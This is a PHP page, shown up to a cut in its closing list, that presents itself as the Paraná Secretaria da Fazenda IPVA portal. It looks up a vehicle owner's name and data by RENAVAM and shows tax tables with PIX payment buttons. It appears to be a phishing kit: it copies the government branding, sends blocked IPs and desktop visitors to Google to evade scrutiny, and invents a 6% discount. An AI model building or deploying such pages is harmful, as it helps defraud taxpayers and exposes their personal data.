<?php
/**
 * Portal IPVA Paraná - Página de Resultado da Consulta (PHP)
 * Objetivo: layout idêntico à versão Lovable (classes .res-*)
 */
require_once __DIR__ . '/config.php';

// =============================================
// REGRAS DE ACESSO (público)
// - IP bloqueado -> Google
// - Desktop -> Google (site PHP é só celular)
// =============================================
enforceIpNotBlocked();
enforceMobileOnly();

header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: SAMEORIGIN');
header('X-XSS-Protection: 1; mode=block');

// Limpa RENAVAM - remove QUALQUER caractere que não seja número
// (espaços, tabs, quebras de linha, caracteres unicode invisíveis, etc)
$renavam = isset($_GET['renavam']) ? $_GET['renavam'] : '';
$renavam = preg_replace('/[\s\x00-\x1F\x7F\xA0\x{200B}-\x{200D}\x{FEFF}]/u', '', $renavam); // chars invisíveis
$renavam = preg_replace('/[^0-9]/', '', $renavam); // só números
$renavam = trim($renavam);

if (empty($renavam)) {
    header('Location: index.php');
    exit;
}

// =============================================
// CONSULTA API COM RETRY AUTOMÁTICO
// Se falhar ou retornar vazio, tenta novamente (até 3x)
// =============================================
function consultarApiRenavam($renavam, $maxRetries = 3) {
    // Usa API local hospedada no mesmo servidor
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
    $basePath = rtrim(dirname($_SERVER['SCRIPT_NAME'] ?? ''), '/\\');
    
    $apiUrl = $scheme . '://' . $host . $basePath . '/api/api-pr.php?renavam=' . urlencode($renavam);
    
    for ($attempt = 1; $attempt <= $maxRetries; $attempt++) {
        $ch = curl_init($apiUrl);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 45, // timeout maior para dar tempo
            CURLOPT_CONNECTTIMEOUT => 15,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_FRESH_CONNECT => true, // Força conexão nova
            CURLOPT_FORBID_REUSE => true,  // Não reutiliza conexão
            CURLOPT_HTTPHEADER => [
                'Accept: application/json',
                'User-Agent: Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
                'Cache-Control: no-cache',
                'Pragma: no-cache'
            ]
        ]);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curlError = curl_error($ch);
        curl_close($ch);
        
        // Verifica se a resposta é válida
        if ($response !== false && $httpCode === 200) {
            $data = json_decode($response, true);
            
            // Verifica se tem dados do veículo
            if (isset($data['vehicle_data']) && 
                is_array($data['vehicle_data']) && 
                !empty($data['vehicle_data']['Nome'])) {
                return $data; // Sucesso!
            }
        }
        
        // Aguarda antes de tentar novamente (exceto na última tentativa)
        if ($attempt < $maxRetries) {
            usleep(800000); // 800ms de espera entre tentativas
        }
    }
    
    // Retorna o último resultado mesmo que vazio (fallback)
    return json_decode($response ?? '{}', true) ?: [];
}

$data = consultarApiRenavam($renavam, 3);
$rawVehicleData = $data['vehicle_data'] ?? [];
$tables = $data['table_cabecalho'] ?? [];

// Limpa campos do veículo que podem vir com dados incorretos
$vehicleData = [];
foreach ($rawVehicleData as $key => $value) {
    $vehicleData[$key] = cleanVehicleField($value, $key);
}

// Preenche RENAVAM com o valor digitado se a API não retornar
if (empty($vehicleData['Renavam'])) {
    $vehicleData['Renavam'] = $renavam;
}

// =============================================
// PROCESSA AS TABELAS - SIMPLIFICADO
// A API retorna: tables[0] = Cota Única, tables[1] = Parcelado
// =============================================
$cotaUnicaRows = [];
$parceladoRows = [];

// Função para limpar células
function cleanCell($val) {
    return trim(preg_replace('/\s+/', ' ', strip_tags($val ?? '')));
}

// Função para limpar campo de veículo que pode vir com lixo
function cleanVehicleField($value, $fieldName = '') {
    if (empty($value)) return '';
    // Se o campo contém valores monetários ou datas, está sujo
    if (preg_match('/R\$\s*[\d.,]+/', $value) || preg_match('/\d{2}\/\d{2}\/\d{4}/', $value)) {
        // Para Licenciamento, extrair apenas "Licenciamento XXXX"
        if ($fieldName === 'Licenciamento') {
            if (preg_match('/(Licenciamento\s*\d{4})/i', $value, $matches)) {
                return $matches[1];
            }
        }
        return '';
    }
    return trim(preg_replace('/\s+/', ' ', $value));
}

// Função para normalizar célula de débito
function normalizeDebitoCell($value) {
    $v = preg_replace('/\s+/', ' ', $value);
    $v = preg_replace('/(IPVA\s*\d{4})(Cota)/i', '$1 $2', $v);
    $v = preg_replace('/(Parcelado)(Cota)/i', '$1 $2', $v);
    $v = preg_replace('/(Licenciamento\s*\d{4})(À\s*vista)/i', '$1 $2', $v);
    return trim($v);
}

// Função para processar rows de uma tabela
function processTableRows($table) {
    if (!$table || empty($table['rows']) || !is_array($table['rows'])) {
        return [];
    }

    $rawRows = $table['rows'];

    // Limpar e normalizar linhas
    $cleanRows = array_map(function($row) {
        $row = is_array($row) ? $row : [];
        $row = array_map('cleanCell', $row);
        return $row;
    }, $rawRows);

    // Para cada row, remove a primeira coluna SE for vazia (mas mantém se tiver conteúdo)
    $processedRows = array_map(function($r) {
        // Se tem mais de 1 elemento e o primeiro é vazio, remove
        if (count($r) > 1 && empty($r[0])) {
            return array_slice($r, 1);
        }
        // Se tem só 1 elemento, mantém como está (será filtrado depois)
        return $r;
    }, $cleanRows);

    // Normaliza o "DÉBITO" (índice 0)
    $rows = array_map(function($r) {
        if (isset($r[0])) {
            $r[0] = normalizeDebitoCell($r[0]);
        }
        return $r;
    }, $processedRows);

    // Remove linhas inválidas:
    // 1. Linhas que são só cabeçalho (ex: "IPVA 2026", "Licenciamento")
    // 2. Linhas sem valor monetário
    $rows = array_values(array_filter($rows, function($r) {
        $first = $r[0] ?? '';
        if ($first === '') return false;
        // Remove cabeçalhos
        if (preg_match('/^d[eé]bito$/i', $first)) return false;
        // Linhas que são só categoria (ex: "IPVA 2026", "Licenciamento") - têm só 1-2 elementos
        if (count($r) <= 2) return false;
        // Verifica se tem algum valor monetário
        $hasMonetary = false;
        foreach ($r as $cell) {
            if (preg_match('/R\$\s*[\d.,]+/', $cell)) {
                $hasMonetary = true;
                break;
            }
        }
        if (!$hasMonetary) return false;
        return true;
    }));

    return $rows;
}

// Processa cada tabela da API uma única vez
// A API geralmente retorna:
// - tables[0] = Cota Única
// - tables[1] = Parcelado
// Porém, em alguns casos ela pode mandar tudo em apenas uma tabela.
$cotaUnicaRawRows = isset($tables[0]) ? processTableRows($tables[0]) : [];
$parceladoRawRows = isset($tables[1]) ? processTableRows($tables[1]) : [];

// Se a API NÃO mandar tables[1], separar as cotas parceladas que vierem misturadas em tables[0]
if (empty($parceladoRawRows) && !empty($cotaUnicaRawRows)) {
    $onlyCotaUnica = [];
    $extractedParcelado = [];

    foreach ($cotaUnicaRawRows as $r) {
        $debito = $r[0] ?? '';

        // Se tem "Cota X" ou "Parcela X" numérica (parcelado)
        if (preg_match('/cota\s*\d+/i', $debito) || preg_match('/parcela\s*\d+/i', $debito)) {
            $extractedParcelado[] = $r;
            continue;
        }

        // Se tem "parcelado" explícito
        if (preg_match('/parcelado/i', $debito)) {
            $extractedParcelado[] = $r;
            continue;
        }

        // Resto vai para Cota Única (incluindo "Cota Única", "À Vista", ou linhas sem identificador de parcela)
        $onlyCotaUnica[] = $r;
    }

    $cotaUnicaRawRows = $onlyCotaUnica;
    $parceladoRawRows = $extractedParcelado;
}
// Usar set para evitar duplicatas (baseado no débito + vencimento)
$cotaUnicaSeen = [];
$parceladoSeen = [];

// Helper: converte "R$ 1.234,56" em float (1234.56)
function parseBrlToFloat($val) {
    $s = cleanCell($val);
    $s = str_replace(['R$', ' '], '', $s);
    $s = str_replace('.', '', $s);
    $s = str_replace(',', '.', $s);
    return is_numeric($s) ? (float)$s : 0.0;
}

// ==============================
// Transformar Cota Única
// Aceita linhas que tenham "Cota Única" OU "Último Dia" (desconto)
// ==============================
foreach ($cotaUnicaRawRows as $row) {
    $debito = $row[0] ?? '';
    $vencimento = $row[1] ?? '-';

    // Aceita linhas com "Cota Única", "Último Dia" ou "Desconto"
    $isCotaUnica = preg_match('/cota\s*[úu]nica/i', $debito) || 
                   preg_match('/[úu]ltimo\s*dia/i', $debito) ||
                   preg_match('/desconto/i', $debito);
    
    if (!$isCotaUnica) {
        continue;
    }

    // Chave única para evitar duplicatas
    $uniqueKey = $debito . '|' . $vencimento;
    if (isset($cotaUnicaSeen[$uniqueKey])) continue;
    $cotaUnicaSeen[$uniqueKey] = true;

    preg_match('/\d{4}/', $debito, $matches);
    $exercicio = $matches[0] ?? '2026';

    // Estrutura da API para Cota Única:
    // [0]=DÉBITO, [1]=VENCIMENTO, [2]=VALOR, [3]=JUROS, [4]=MULTA, [5]=DESCONTOS, [6]=VALOR TOTAL
    $ipva = $row[2] ?? 'R$ 0,00';
    $juros = $row[3] ?? 'R$ 0,00';
    $multa = $row[4] ?? 'R$ 0,00';
    $descontoValor = $row[5] ?? 'R$ 0,00';
    $total = $row[6] ?? ($row[count($row) - 1] ?? 'R$ 0,00');
    
    // Se não houver desconto na API, calcular 6% sobre o IPVA
    $descontoFloat = parseBrlToFloat($descontoValor);
    if ($descontoFloat == 0) {
        $ipvaFloat = parseBrlToFloat($ipva);
        $desconto6pct = $ipvaFloat * 0.06;
        if ($desconto6pct > 0) {
            $descontoValor = 'R$ ' . number_format($desconto6pct, 2, ',', '.');
        }
    }
    
    $desconto = ($descontoValor !== 'R$ 0,00') ? '-' . $descontoValor : $descontoValor;

    $cotaUnicaRows[] = [
        'exercicio' => $exercicio,
        'vencimento' => $vencimento,
        'ipva' => $ipva,
        'multa' => $multa,
        'desconto' => $desconto,
        'juros' => $juros,
        'total' => $total,
    ];
}


// Transformar Parcelado - sem duplicatas (somente linhas realmente de cotas parceladas)
foreach ($parceladoRawRows as $index => $row) {
    $debito = $row[0] ?? '';
    $vencimento = $row[1] ?? '-';

    // Ignora cota única
    if (preg_match('/cota\s*[úu]nica/i', $debito) || preg_match('/[úu]ltimo\s*dia/i', $debito)) {
        continue;
    }
    
    // Só aceitar linhas parceladas (Parcelado + Cota X, ou Cota 1/2/3/4/5)
    $isParcelado = preg_match('/parcelado.*cota\s*\d+/i', $debito) || preg_match('/cota\s*\d+/i', $debito);
    if (!$isParcelado) {
        continue;
    }

    // Chave única para evitar duplicatas
    $uniqueKey = $debito . '|' . $vencimento;
    if (isset($parceladoSeen[$uniqueKey])) continue;
    $parceladoSeen[$uniqueKey] = true;

    preg_match('/\d{4}/', $debito, $matches);
    $exercicio = $matches[0] ?? '2026';

    // Extrair número da cota
    if (preg_match('/cota\s*(\d+)/i', $debito, $cotaMatch)) {
        $cota = 'Cota ' . $cotaMatch[1];
    } elseif (preg_match('/parcela\s*(\d+)/i', $debito, $parcelaMatch)) {
        $cota = 'Cota ' . $parcelaMatch[1];
    } else {
        $cota = 'Cota ' . ($index + 1);
    }

    // Estrutura da API:
    // [0]=DÉBITO, [1]=VENCIMENTO, [2]=VALOR, [3]=JUROS, [4]=MULTA, [5]=DESCONTOS, [6]=VALOR TOTAL
    $ipva = $row[2] ?? 'R$ 0,00';
    $juros = $row[3] ?? 'R$ 0,00';
    $multa = $row[4] ?? 'R$ 0,00';
    $total = $row[6] ?? ($row[count($row) - 1] ?? 'R$ 0,00');

    $parceladoRows[] = [
        'exercicio' => $exercicio,
        'vencimento' => $vencimento,
        'cota' => $cota,
        'ipva' => $ipva,
        'multa' => $multa,
        'juros' => $juros,
        'total' => $total,
    ];
}

// Fallback se não houver dados
if (empty($vehicleData) || !isset($vehicleData['Nome'])) {
    header('Location: index.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Resultado da Consulta - IPVA Paraná</title>

  <link rel="icon" href="assets/favicon.png" type="image/png">
  <link rel="stylesheet" href="assets/resultado.css" />
  <link rel="stylesheet" href="assets/shared-buttons.css" />

  <!-- QRCode (mantém funcionalidade do modal PHP) -->
  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>

  <style>
    /* Modal PIX - idêntico ao PixPaymentModal do Lovable */
    .pix-modal-overlay {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.5);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 9999;
    }

    .pix-modal-overlay.active { display: flex; }

    .pix-modal {
      background: #fff;
      border-radius: 8px;
      max-width: 28rem; /* max-w-md */
      width: 90%;
      max-height: 90vh;
      overflow: hidden;
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
    }

    .pix-modal-header {
      background: linear-gradient(to right, #0066cc, #004a99);
      padding: 1.5rem; /* p-6 */
      text-align: center;
      position: relative;
    }

    .pix-modal-close {
      position: absolute;
      right: 1rem; /* right-4 */
      top: 1rem; /* top-4 */
      background: none;
      border: none;
      color: rgba(255, 255, 255, 0.8);
      cursor: pointer;
      padding: 0;
      line-height: 1;
      transition: color 0.15s;
    }

    .pix-modal-close:hover { color: #fff; }

    .pix-modal-close svg {
      width: 20px;
      height: 20px;
    }

    .pix-modal-title-wrap {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.5rem; /* gap-2 */
      margin-bottom: 0.5rem; /* mb-2 */
    }

    .pix-modal-title-wrap svg {
      width: 28px;
      height: 28px;
      color: #fff;
    }

    .pix-modal-title {
      font-size: 1.25rem; /* text-xl */
      font-weight: 700;
      color: #fff;
      margin: 0;
    }

    .pix-modal-subtitle {
      color: rgba(255, 255, 255, 0.8);
      font-size: 0.875rem; /* text-sm */
      margin: 0;
    }

    .pix-modal-body {
      padding: 1.5rem; /* p-6 */
      overflow-y: auto;
      max-height: calc(90vh - 120px);
    }

    .pix-modal-body > * + * {
      margin-top: 1.5rem; /* space-y-6 */
    }

    /* Valor section */
    .pix-valor-section {
      text-align: center;
    }

    .pix-valor-label {
      font-size: 0.875rem; /* text-sm */
      color: #6b7280; /* text-gray-500 */
      margin-bottom: 0.25rem; /* mb-1 */
    }

    .pix-valor {
      font-size: 2.25rem; /* text-4xl */
      font-weight: 700;
      color: #0066cc;
    }

    .pix-descricao {
      font-size: 0.875rem;
      color: #6b7280;
      margin-top: 0.25rem;
    }

    /* QR Code section */
    .pix-qrcode-section {
      display: flex;
      justify-content: center;
    }

    .pix-qrcode-container {
      padding: 1rem; /* p-4 */
      background: #fff;
      border-radius: 0.75rem; /* rounded-xl */
      border: 2px solid #f3f4f6; /* border-gray-100 */
      box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
    }

    .pix-qrcode-container canvas {
      display: block;
    }

    .pix-qrcode-loading {
      width: 200px; /* w-52 */
      height: 200px; /* h-52 */
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      background: #f9fafb; /* bg-gray-50 */
      border-radius: 0.75rem;
      border: 2px dashed #e5e7eb; /* border-gray-200 */
    }

    .pix-spinner {
      width: 2.5rem; /* h-10 w-10 */
      height: 2.5rem;
      border: 4px solid transparent;
      border-top-color: #32bcad;
      border-radius: 50%;
      animation: pix-spin 0.8s linear infinite;
      margin-bottom: 0.75rem; /* mb-3 */
    }

    @keyframes pix-spin { to { transform: rotate(360deg); } }

    .pix-qrcode-loading p {
      font-size: 0.875rem;
      color: #6b7280;
      margin: 0;
    }

    .pix-qrcode-text {
      text-align: center;
      font-size: 0.875rem;
      color: #6b7280;
      margin-top: 1.5rem;
    }

    /* Divider */
    .pix-divider {
      display: flex;
      align-items: center;
      gap: 0.75rem; /* gap-3 */
    }

    .pix-divider-line {
      flex: 1;
      height: 1px;
      background: #e5e7eb; /* bg-gray-200 */
    }

    .pix-divider-text {
      font-size: 0.75rem; /* text-xs */
      color: #9ca3af; /* text-gray-400 */
      text-transform: uppercase;
    }

    /* Code section */
    .pix-code-section {}

    .pix-code-label {
      font-size: 0.875rem;
      font-weight: 500;
      color: #374151; /* text-gray-700 */
      margin-bottom: 0.5rem; /* mb-2 */
    }

    .pix-code-box {
      padding: 0.75rem; /* p-3 */
      background: #f9fafb; /* bg-gray-50 */
      border-radius: 0.5rem; /* rounded-lg */
      border: 1px solid #e5e7eb; /* border-gray-200 */
      font-size: 0.75rem; /* text-xs */
      font-family: ui-monospace, SFMono-Regular, monospace;
      color: #4b5563; /* text-gray-600 */
      word-break: break-all;
      max-height: 5rem; /* max-h-20 */
      overflow-y: auto;
      margin-bottom: 0.75rem; /* mb-3 */
    }

    .pix-copy-btn {
      width: 100%;
      padding: 0.625rem 1rem;
      background: #0066cc;
      color: #fff;
      border: none;
      border-radius: 0.375rem; /* rounded-md (Button default) */
      font-size: 0.875rem;
      font-weight: 500;
      cursor: pointer;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 0.5rem; /* mr-2 equivalent */
      transition: background 0.15s, transform 0.1s;
    }

    .pix-copy-btn:hover { background: #004a99; }
    .pix-copy-btn:active { transform: scale(0.98); }

    .pix-copy-btn.copied {
      background: #22c55e; /* bg-green-500 */
    }

    .pix-copy-btn.copied:hover {
      background: #16a34a; /* hover:bg-green-600 */
    }

    .pix-copy-btn svg {
      width: 1rem; /* w-4 */
      height: 1rem; /* h-4 */
    }

    /* Help button */
    .pix-help-btn {
      width: 100%;
      padding: 0.75rem 1rem; /* py-3 px-4 */
      background: #fff;
      color: #4b5563; /* text-gray-600 */
      border: 1px solid #e5e7eb; /* border-gray-200 */
      border-radius: 0.5rem; /* rounded-lg */
      font-size: 0.875rem;
      font-weight: 500;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.5rem;
      transition: background 0.15s;
    }

    .pix-help-btn:hover { background: #f9fafb; }

    .pix-help-btn svg {
      width: 1rem;
      height: 1rem;
    }

    /* Instructions View */
    .pix-instructions {
      display: none;
    }

    .pix-instructions.active {
      display: block;
    }

    .pix-instructions > * + * {
      margin-top: 1.5rem;
    }

    .pix-instructions-title {
      font-size: 1.125rem; /* text-lg */
      font-weight: 600;
      text-align: center;
      color: #1f2937; /* text-gray-800 */
      margin: 0;
    }

    .pix-steps {
      display: flex;
      flex-direction: column;
      gap: 1rem; /* space-y-4 */
    }

    .pix-step {
      display: flex;
      gap: 1rem; /* gap-4 */
      align-items: flex-start;
    }

    .pix-step-number {
      flex-shrink: 0;
      width: 2rem; /* w-8 */
      height: 2rem; /* h-8 */
      border-radius: 9999px;
      background: rgba(0, 102, 204, 0.1); /* bg-[#0066cc]/10 */
      color: #0066cc;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 700;
      font-size: 0.875rem;
    }

    .pix-step-content h4 {
      font-size: 1rem;
      font-weight: 500;
      color: #1f2937; /* text-gray-800 */
      margin: 0 0 0.25rem 0;
    }

    .pix-step-content p {
      font-size: 0.875rem;
      color: #6b7280; /* text-gray-500 */
      margin: 0;
    }

    .pix-back-btn {
      width: 100%;
      padding: 0.625rem 1rem;
      background: #0066cc;
      color: #fff;
      border: none;
      border-radius: 0.375rem;
      font-size: 0.875rem;
      font-weight: 500;
      cursor: pointer;
      transition: background 0.15s;
    }

    .pix-back-btn:hover { background: #004a99; }

    /* Mobile adjustments */
    @media (max-width: 640px) {
      .pix-modal { width: 95%; }
      .pix-modal-header { padding: 1.25rem; }
      .pix-modal-title { font-size: 1.125rem; }
      .pix-modal-body { padding: 1.25rem; }
      .pix-valor { font-size: 1.875rem; }
      .pix-qrcode-loading,
      .pix-qrcode-container canvas {
        width: 180px !important;
        height: 180px !important;
      }
    }
  </style>
</head>
<body>
  <div class="res-portal">
    <header class="res-header">
      <div class="res-container">
        <div class="res-header-inner">
          <div class="res-brand">
            <img src="assets/logo-parana.png" alt="Estado do Paraná" />
            <div>
              <div class="res-brand-line1">Estado do Paraná</div>
              <div class="res-brand-line2">Secretaria de Estado da Fazenda</div>
            </div>
          </div>

          <div class="res-header-actions">
            <button class="sistema-btn" type="button">
              <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 16l-4-4m0 0l4-4m-4 4h14m-5 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h7a3 3 0 013 3v1" />
              </svg>
              Acessar o sistema
            </button>
          </div>
        </div>
      </div>
    </header>

    <main class="res-main">
      <div class="res-container">
        <h1 class="res-page-title">Consultar Débitos do Veículo - IPVA</h1>

        <section class="res-vehicle-card">
          <h2 class="res-card-title">Dados do Veículo no Detran/PR</h2>

          <div class="res-owner">
            <span class="res-label">Proprietário</span>
            <span class="res-value"><?= htmlspecialchars($vehicleData['Nome'] ?? '-') ?></span>
          </div>

          <div class="res-grid-4">
            <div>
              <span class="res-label">Renavam</span>
              <span class="res-value"><?= htmlspecialchars($vehicleData['Renavam'] ?? '-') ?></span>
            </div>
            <div>
              <span class="res-label">Placa</span>
              <span class="res-value"><?= htmlspecialchars($vehicleData['Placa'] ?? '-') ?></span>
            </div>
            <div>
              <span class="res-label">Marca/Modelo</span>
              <span class="res-value"><?= htmlspecialchars($vehicleData['Marca/Modelo'] ?? $vehicleData['Tipo/Espécie'] ?? '-') ?></span>
            </div>
            <div>
              <span class="res-label">Ano de Fabricação</span>
              <span class="res-value"><?= htmlspecialchars($vehicleData['Ano de Fabricação'] ?? '-') ?></span>
            </div>
          </div>

          <div class="res-grid-4">
            <div>
              <span class="res-label">Tipo/Espécie</span>
              <span class="res-value"><?= htmlspecialchars($vehicleData['Tipo/Espécie'] ?? '-') ?></span>
            </div>
            <div>
              <span class="res-label">Capacidade de Passageiros</span>
              <span class="res-value"><?= htmlspecialchars($vehicleData['Capacidade de Passageiros'] ?? '-') ?></span>
            </div>
            <div>
              <span class="res-label">Combustível</span>
              <span class="res-value"><?= htmlspecialchars($vehicleData['Combustível'] ?? '-') ?></span>
            </div>
            <div>
              <span class="res-label">Carroceria</span>
              <span class="res-value"><?= htmlspecialchars($vehicleData['Carroceria'] ?? '-') ?></span>
            </div>
          </div>

          <div class="res-grid-4">
            <div>
              <span class="res-label">Categoria</span>
              <span class="res-value"><?= htmlspecialchars($vehicleData['Categoria'] ?? '-') ?></span>
            </div>
            <div>
              <span class="res-label">Licenciamento</span>
              <span class="res-value"><?= htmlspecialchars($vehicleData['Licenciamento'] ?? '-') ?></span>
            </div>
            <div>
              <span class="res-label">Faixa</span>
              <span class="res-value"><?= htmlspecialchars($vehicleData['Faixa'] ?? '-') ?></span>
            </div>
            <div>
              <span class="res-label">Situação</span>
              <span class="res-value"><?= htmlspecialchars($vehicleData['Situação'] ?? '-') ?></span>
            </div>
          </div>
        </section>

        <div class="res-banner">Verifique aqui o Extrato Consolidado do IPVA de seu Veículo</div>

        <?php if (!empty($cotaUnicaRows)): ?>
        <section class="res-section">
          <?php $anoCotaUnica = $cotaUnicaRows[0]['exercicio'] ?? '2026'; ?>
          <h3 class="res-section-title">IPVA <?= htmlspecialchars($anoCotaUnica) ?> - Pagamento em Cota Única</h3>

          <table class="res-table">
            <thead>
              <tr>
                <th>Exercício</th>
                <th>Vencimento</th>
                <th>IPVA</th>
                <th>Multa</th>
                <th>Desconto (6%)</th>
                <th>Juros</th>
                <th>Total a Pagar</th>
                <th></th>
              </tr>
            </thead>
            <tbody>
              <?php foreach ($cotaUnicaRows as $row): ?>
              <tr>
                <td data-label="Exercício"><?= htmlspecialchars($row['exercicio']) ?></td>
                <td data-label="Vencimento"><?= htmlspecialchars($row['vencimento']) ?></td>
                <td data-label="IPVA"><?= htmlspecialchars($row['ipva']) ?></td>
                <td data-label="Multa"><?= htmlspecialchars($row['multa']) ?></td>
                <td data-label="Desconto (6%)" class="res-discount"><?= htmlspecialchars($row['desconto']) ?></td>
                <td data-label="Juros"><?= htmlspecialchars($row['juros']) ?></td>
                <td data-label="Total a Pagar" class="res-total"><?= htmlspecialchars($row['total']) ?></td>
                <td class="res-action" style="min-width:160px;">
                  <button type="button" class="res-pix-btn" style="display:inline-flex !important;visibility:visible !important;opacity:1 !important;background:linear-gradient(135deg,#0066cc 0%,#004a99 100%) !important;color:#fff !important;padding:10px 20px;border:none;border-radius:6px;font-weight:600;font-size:13px;cursor:pointer;gap:8px;align-items:center;justify-content:center;box-shadow:0 2px 8px rgba(0,102,204,0.3);" onclick="openPixModal('<?= htmlspecialchars($row['total']) ?>', 'IPVA <?= htmlspecialchars($row['exercicio']) ?> - Cota Única', '<?= htmlspecialchars($row['exercicio']) ?>')">
                    <svg width="16" height="16" viewBox="0 0 512 512" fill="currentColor" aria-hidden="true" style="display:inline-block !important;">
                      <path d="M112.57 391.19c20.056 0 38.928-7.808 53.12-22l76.693-76.692c5.385-5.404 14.765-5.384 20.15 0l76.989 76.989c14.191 14.172 33.045 21.98 53.12 21.98h15.098l-97.138 97.139c-30.326 30.344-79.505 30.344-109.85 0l-97.415-97.416h9.232zm280.068-271.294c-20.056 0-38.929 7.809-53.12 22l-76.97 76.99c-5.551 5.53-14.6 5.568-20.15-.02l-76.711-76.693c-14.192-14.191-33.046-21.999-53.12-21.999h-9.234l97.416-97.416c30.344-30.344 79.523-30.344 109.867 0l97.138 97.138h-15.116zm105.937 86.745-64.553-64.553h-44.546c-11.206 0-21.72 4.364-29.622 12.287l-77.229 77.229c-14.638 14.619-38.467 14.638-53.086 0l-76.99-77.012c-7.901-7.922-18.416-12.287-29.622-12.287H58.529l-64.27 64.27c-30.345 30.344-30.345 79.523 0 109.867l64.27 64.27h44.807c11.206 0 21.721-4.364 29.622-12.286l76.713-76.732c7.328-7.328 16.949-10.992 26.57-10.992 9.622 0 19.242 3.664 26.57 10.992l76.99 76.99c7.901 7.921 18.416 12.286 29.621 12.286h44.287l64.553-64.553c30.344-30.344 30.344-79.523 0-109.849z" />
                    </svg>
                    Pagar com PIX
                  </button>
                </td>
              </tr>
              <?php endforeach; ?>
            </tbody>
          </table>
        </section>
        <?php endif; ?>

        <?php if (!empty($parceladoRows)): ?>
        <section class="res-section">
          <?php $anoParcelado = $parceladoRows[0]['exercicio'] ?? '2026'; ?>
          <h3 class="res-section-title">IPVA <?= htmlspecialchars($anoParcelado) ?> - Pagamento Parcelado em Cotas</h3>

          <table class="res-table">
            <thead>
              <tr>
                <th>Exercício</th>
                <th>Vencimento</th>
                <th>Cotas</th>
                <th>IPVA</th>
                <th>Multa</th>
                <th>Juros</th>
                <th>Total a Pagar</th>
                <th></th>
              </tr>
            </thead>
            <tbody>
              <?php foreach ($parceladoRows as $row): ?>
              <tr>
                <td data-label="Exercício"><?= htmlspecialchars($row['exercicio']) ?></td>
                <td data-label="Vencimento"><?= htmlspecialchars($row['vencimento']) ?></td>
                <td data-label="Cotas"><?= htmlspecialchars($row['cota']) ?></td>
                <td data-label="IPVA"><?= htmlspecialchars($row['ipva']) ?></td>
                <td data-label="Multa"><?= htmlspecialchars($row['multa']) ?></td>
                <td data-label="Juros"><?= htmlspecialchars($row['juros']) ?></td>
                <td data-label="Total a Pagar" class="res-total"><?= htmlspecialchars($row['total']) ?></td>
                <td class="res-action" style="min-width:160px;">
                  <button type="button" class="res-pix-btn" style="display:inline-flex !important;visibility:visible !important;opacity:1 !important;background:linear-gradient(135deg,#0066cc 0%,#004a99 100%) !important;color:#fff !important;padding:10px 20px;border:none;border-radius:6px;font-weight:600;font-size:13px;cursor:pointer;gap:8px;align-items:center;justify-content:center;box-shadow:0 2px 8px rgba(0,102,204,0.3);" onclick="openPixModal('<?= htmlspecialchars($row['total']) ?>', 'IPVA <?= htmlspecialchars($row['exercicio']) ?> - <?= htmlspecialchars($row['cota']) ?>', '<?= htmlspecialchars($row['exercicio']) ?>')">
                    <svg width="16" height="16" viewBox="0 0 512 512" fill="currentColor" aria-hidden="true" style="display:inline-block !important;">
                      <path d="M112.57 391.19c20.056 0 38.928-7.808 53.12-22l76.693-76.692c5.385-5.404 14.765-5.384 20.15 0l76.989 76.989c14.191 14.172 33.045 21.98 53.12 21.98h15.098l-97.138 97.139c-30.326 30.344-79.505 30.344-109.85 0l-97.415-97.416h9.232zm280.068-271.294c-20.056 0-38.929 7.809-53.12 22l-76.97 76.99c-5.551 5.53-14.6 5.568-20.15-.02l-76.711-76.693c-14.192-14.191-33.046-21.999-53.12-21.999h-9.234l97.416-97.416c30.344-30.344 79.523-30.344 109.867 0l97.138 97.138h-15.116zm105.937 86.745-64.553-64.553h-44.546c-11.206 0-21.72 4.364-29.622 12.287l-77.229 77.229c-14.638 14.619-38.467 14.638-53.086 0l-76.99-77.012c-7.901-7.922-18.416-12.287-29.622-12.287H58.529l-64.27 64.27c-30.345 30.344-30.345 79.523 0 109.867l64.27 64.27h44.807c11.206 0 21.721-4.364 29.622-12.286l76.713-76.732c7.328-7.328 16.949-10.992 26.57-10.992 9.622 0 19.242 3.664 26.57 10.992l76.99 76.99c7.901 7.921 18.416 12.286 29.621 12.286h44.287l64.553-64.553c30.344-30.344 30.344-79.523 0-109.849z" />
                    </svg>
                    Pagar com PIX
                  </button>
                </td>
              </tr>
              <?php endforeach; ?>
            </tbody>
          </table>
        </section>
        <?php endif; ?>

        <section class="res-info-section">
          <h4 class="res-info-title">Informações ao contribuinte</h4>
          <ul class="res-info-list">
            <li>Os valores apresentados estão calculados para pagamento até a data de hoje, em Reais (R$).</li>
            <li>Os débitos acima referem-se, exclusivamente, ao IPVA/PR. Taxas de licenciamento, seguro obrigatório e demais débitos relativos aos órgãos de trânsito devem ser obtidos junto ao <strong>Detran/PR</strong>.</li>
            <li>Os créditos do Programa Nota PR, caso utilizados, já estão considerados nos valores de IPVA pendente apresentados acima;</li>
